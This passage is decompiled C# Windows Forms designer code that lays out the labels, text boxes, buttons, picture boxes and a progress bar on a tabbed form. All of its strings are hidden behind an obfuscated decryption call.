		((Control)label87).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6058265D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((Control)textBox51).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 10f, (FontStyle)1);
		((Control)textBox51).Location = new Point(418, 93);
		((Control)textBox51).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C12A26 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)textBox51).Size = new Size(198, 23);
		((Control)textBox51).TabIndex = 129;
		((Control)textBox51).TextChanged += textBox51_TextChanged;
		((Control)textBox52).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE6D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549), 10f, (FontStyle)1);
		((Control)textBox52).Location = new Point(222, 93);
		((Control)textBox52).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E2BBD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((Control)textBox52).Size = new Size(191, 23);
		((Control)textBox52).TabIndex = 128;
		((Control)textBox52).TextChanged += textBox52_TextChanged;
		((Control)textBox53).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB9DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76), 10f, (FontStyle)1);
		((Control)textBox53).Location = new Point(26, 93);
		((Control)textBox53).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9238D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)textBox53).Size = new Size(191, 23);
		((Control)textBox53).TabIndex = 127;
		((Control)textBox53).TextChanged += textBox53_TextChanged;
		((Control)label88).AutoSize = true;
		((Control)label88).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)label88).ForeColor = SystemColors.ControlLightLight;
		((Control)label88).Location = new Point(417, 73);
		((Control)label88).Margin = new Padding(5, 0, 5, 0);
		((Control)label88).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x39C71C3C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label88).Size = new Size(79, 16);
		((Control)label88).TabIndex = 126;
		((Control)label88).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FAAA5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((Control)label89).AutoSize = true;
		((Control)label89).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)label89).ForeColor = SystemColors.ControlLightLight;
		((Control)label89).Location = new Point(217, 73);
		((Control)label89).Margin = new Padding(5, 0, 5, 0);
		((Control)label89).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69462F2D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((Control)label89).Size = new Size(98, 16);
		((Control)label89).TabIndex = 125;
		((Control)label89).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12235BC8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)label90).AutoSize = true;
		((Control)label90).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 10f, (FontStyle)1);
		((Control)label90).ForeColor = SystemColors.ControlLightLight;
		((Control)label90).Location = new Point(25, 73);
		((Control)label90).Margin = new Padding(5, 0, 5, 0);
		((Control)label90).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x122360D0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)label90).Size = new Size(82, 16);
		((Control)label90).TabIndex = 124;
		((Control)label90).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE85E0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		pictureBox22.BorderStyle = (BorderStyle)2;
		((Control)pictureBox22).Enabled = false;
		((Control)pictureBox22).Location = new Point(640, 93);
		((Control)pictureBox22).Margin = new Padding(0);
		((Control)pictureBox22).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B0D10 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)pictureBox22).Size = new Size(590, 461);
		pictureBox22.SizeMode = (PictureBoxSizeMode)4;
		pictureBox22.TabIndex = 123;
		pictureBox22.TabStop = false;
		((Control)pictureBox22).Click += pictureBox22_Click;
		((Control)button74).BackColor = Color.Green;
		((Control)button74).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 10f, (FontStyle)1);
		((Control)button74).ForeColor = SystemColors.ControlLightLight;
		((Control)button74).Location = new Point(20, 337);
		((Control)button74).Margin = new Padding(5, 3, 5, 3);
		((Control)button74).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA268D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208);
		((Control)button74).Size = new Size(151, 23);
		((Control)button74).TabIndex = 119;
		((Control)button74).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694614E5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((ButtonBase)button74).UseVisualStyleBackColor = false;
		((Control)button74).Click += button74_Click;
		((Control)label91).AutoSize = true;
		((Control)label91).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label91).ForeColor = SystemColors.ControlLightLight;
		((Control)label91).Location = new Point(17, 256);
		((Control)label91).Margin = new Padding(5, 0, 5, 0);
		((Control)label91).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E92209 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label91).Size = new Size(89, 19);
		((Control)label91).TabIndex = 117;
		((Control)label91).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA1024E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		pictureBox26.BorderStyle = (BorderStyle)2;
		((Control)pictureBox26).Location = new Point(21, 278);
		((Control)pictureBox26).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox26).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB1FE1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((Control)pictureBox26).Size = new Size(236, 53);
		pictureBox26.SizeMode = (PictureBoxSizeMode)1;
		pictureBox26.TabIndex = 116;
		pictureBox26.TabStop = false;
		((Control)button76).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button76).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583C09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c), 10f, (FontStyle)1);
		((Control)button76).ForeColor = SystemColors.ControlLightLight;
		((Control)button76).Location = new Point(172, 337);
		((Control)button76).Margin = new Padding(5, 3, 5, 3);
		((Control)button76).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F7251E2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)button76).Size = new Size(84, 23);
		((Control)button76).TabIndex = 115;
		((Control)button76).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2A08C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((ButtonBase)button76).UseVisualStyleBackColor = false;
		((Control)button76).Click += button76_Click;
		((Control)button78).BackColor = Color.MediumOrchid;
		((Control)button78).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F7277BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button78).ForeColor = SystemColors.ControlLightLight;
		((Control)button78).Location = new Point(726, 8);
		((Control)button78).Margin = new Padding(5, 3, 5, 3);
		((Control)button78).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -746516475 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)button78).Size = new Size(115, 38);
		((Control)button78).TabIndex = 113;
		((Control)button78).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EA57E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((ButtonBase)button78).UseVisualStyleBackColor = false;
		((Control)button78).Click += button78_Click;
		((Control)button81).BackColor = Color.Blue;
		((Control)button81).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FB09D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button81).ForeColor = SystemColors.ControlLightLight;
		((Control)button81).Location = new Point(877, 8);
		((Control)button81).Margin = new Padding(5, 3, 5, 3);
		((Control)button81).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875FCDD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)button81).Size = new Size(107, 38);
		((Control)button81).TabIndex = 107;
		((Control)button81).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AD955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((ButtonBase)button81).UseVisualStyleBackColor = false;
		((Control)button81).Click += button81_Click;
		((Control)progressBar4).Location = new Point(640, 72);
		((Control)progressBar4).Margin = new Padding(5, 3, 5, 3);
		((Control)progressBar4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AE0DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((Control)progressBar4).Size = new Size(590, 18);
		((Control)progressBar4).TabIndex = 108;
		((Control)lblWarning).AutoSize = true;
		((Control)lblWarning).Location = new Point(1, 771);
		((Control)lblWarning).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EED0A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)lblWarning).Size = new Size(50, 15);
		((Control)lblWarning).TabIndex = 196;
		((Control)lblWarning).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77F0BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344);
		((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 15f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.FromArgb(16, 26, 40);
		((Form)this).ClientSize = new Size(1258, 795);
		((Control)this).Controls.Add((Control)(object)lblWarning);
		((Control)this).Controls.Add((Control)(object)tabControl1);
		((Control)this).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x2F7FD83 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Form)this).Margin = new Padding(5, 3, 5, 3);
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12713290 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Form)this).ShowIcon = false;
		((Control)this).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC58B2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8);
		((Form)this).Load += Form1_Load;
		((Control)tabPage2).ResumeLayout(false);
		((Control)tabPage2).PerformLayout();
		((Control)tabPage2tsad).ResumeLayout(false);
		((Control)tabPage2tsad).PerformLayout();
		((ISupportInitialize)pictureBox4).EndInit();
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((ISupportInitialize)pictureBox10).EndInit();
		((ISupportInitialize)pictureBox9).EndInit();
		((ISupportInitialize)pictureBox8).EndInit();
		((ISupportInitialize)pictureBox7).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox6).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage3).ResumeLayout(false);
		((Control)tabPage3).PerformLayout();
		((ISupportInitialize)pictureBox21).EndInit();
		((ISupportInitialize)pictureBox20).EndInit();
		((ISupportInitialize)pictureBox31).EndInit();
		((ISupportInitialize)pictureBox35).EndInit();
		((ISupportInitialize)pictureBox36).EndInit();
		((Control)tabPage4).ResumeLayout(false);
		((Control)tabPage4).PerformLayout();
		((ISupportInitialize)pictureBox11).EndInit();
		((ISupportInitialize)pictureBox12).EndInit();
		((ISupportInitialize)pictureBox13).EndInit();
		((ISupportInitialize)pictureBox14).EndInit();
		((ISupportInitialize)pictureBox15).EndInit();
		((ISupportInitialize)pictureBox16).EndInit();
		((ISupportInitialize)pictureBox17).EndInit();
		((ISupportInitialize)pictureBox18).EndInit();
		((ISupportInitialize)pictureBox19).EndInit();
		((Control)tabPage5).ResumeLayout(false);
		((Control)tabPage5).PerformLayout();
		((ISupportInitialize)pictureBox22).EndInit();
		((ISupportInitialize)pictureBox26).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
